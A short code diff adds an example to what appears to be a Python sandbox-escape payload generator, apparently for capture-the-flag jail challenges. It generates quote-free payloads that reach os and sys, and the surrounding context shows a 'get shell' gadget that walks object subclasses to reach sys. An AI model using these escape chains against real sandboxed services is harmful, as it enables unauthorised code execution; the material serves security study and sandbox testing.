@@ -26,6 +26,14 @@ assert all(c not in payload for c in '\'"')
 
 print("\n---------\n")
 
+#same as above, but inlined
+jailbreak.config(inline=True, provided=['sys'], char='\'"')
+payload = jailbreak.os()
+print(payload)
+assert all(c not in payload for c in '\'"')
+
+print("\n---------\n")
+
 #example get shell full chain with user gadget
 def sys__user(*, str):
     return [c for c in ().__class__.__base__.__subclasses__() if 'wrap_close' in str(c)][0].__init__.__globals__['sys']
@@ -50,3 +58,4 @@ jailbreak.register_user_gadget(ls__user, 'python')
 
 payload = jailbreak.ls()  #ls does not exist in repo gadgets, but is provided by user
 print(payload)
+
